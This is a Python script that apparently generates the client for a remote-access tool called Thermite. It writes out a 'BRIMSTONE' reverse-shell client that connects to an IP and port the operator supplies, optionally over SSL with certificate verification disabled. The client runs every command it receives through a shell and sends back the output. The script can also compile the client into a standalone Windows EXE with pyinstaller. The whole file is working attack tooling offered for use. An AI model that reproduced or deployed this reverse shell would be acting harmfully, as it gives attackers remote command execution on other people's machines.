import argparse
import shutil
import sys
import os

parser = argparse.ArgumentParser()
parser.add_argument('-i', metavar='IP', help='IP Address of Thermite server')
parser.add_argument('-p', metavar='PORT', help='Port of Thermite server')
parser.add_argument('-c', help='Compile the client to EXE', action='store_true')
parser.add_argument('-s', metavar='YES/NO', help='Whether or not to use SSL (Valid Values: YES or NO)')
args = parser.parse_args()

if args.i:
    ip_address = args.i
else:
    print('No IP Address specified. Please use the -i switch.')
    sys.exit()

if args.p:
    port = args.p
else:
    print('No Port specified. Please use the -p switch.')
    sys.exit()

if args.s == 'YES':
    use_ssl = True
else:
    use_ssl = False

python_script = """
import subprocess
import socket
import ssl
import os


def client_connect():
    client = socket.socket()
    if use_ssl:
        args = ssl.SSLContext()
        ssl.PROTOCOL_TLS_CLIENT
        args.verify_mode = ssl.CERT_NONE
        args.check_hostname = False
        client = args.wrap_socket(client)
    client.connect(('{}', {}))
    return client


def recv_commands(s_conn):
    while True:
        data = s_conn.recv(20480)
        if data[:2].decode('utf-8') == 'cd':
            os.chdir(data[3:].decode('utf-8'))
        if data[:].decode('utf-8') == 'exit':
            break
        if len(data) > 0:
            command = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out_bytes = command.stdout.read() + command.stderr.read()
            out_str = str(out_bytes, 'utf-8')
            s_conn.send(str.encode(out_str + 'BRIMSTONE: ' + str(os.getcwd()) + '> '))
            print(out_str)
    s_conn.close()


use_ssl = {}
conn = client_connect()
recv_commands(conn)
""".format(ip_address, port, use_ssl)

cwd = os.path.dirname(os.path.realpath(__file__))
client_dir = os.path.normpath('/')
full_script_path = cwd + client_dir + 'BRIMSTONE.py'

with open(full_script_path, 'w') as output_file:
    output_file.write(python_script)

if args.c:
    os.system('pyinstaller --onefile --log-level CRITICAL --distpath {} {}'.format(cwd, full_script_path))

    try:
        os.remove('BRIMSTONE.spec')
        shutil.rmtree('build')
        shutil.rmtree(cwd + client_dir + '__pycache__')
    except:
        pass
